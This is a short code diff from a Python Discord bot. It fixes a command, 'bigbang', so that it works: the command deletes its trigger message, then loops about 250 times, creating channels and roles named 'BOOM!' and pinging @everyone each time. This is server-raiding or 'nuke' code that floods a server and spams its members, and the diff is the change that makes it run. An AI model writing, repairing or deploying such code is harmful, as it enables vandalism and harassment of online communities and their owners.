@@ -39,10 +39,10 @@ bangs = 0
 async def bigbang(ctx):
     await ctx.message.delete()
     bigbangs = 0
-    while 400 >= bigbangs:
-        await guild.create_text_channel(name="BOOM!")
+    while 250 >= bigbangs:
+        await ctx.guild.create_text_channel(name="BOOM!")
         await ctx.send("@everyone")
-        await guild.create_role(name="BOOM!")
+        await ctx.guild.create_role(name="BOOM!")
         bigbangs += 1
     bigbangs = 0
 
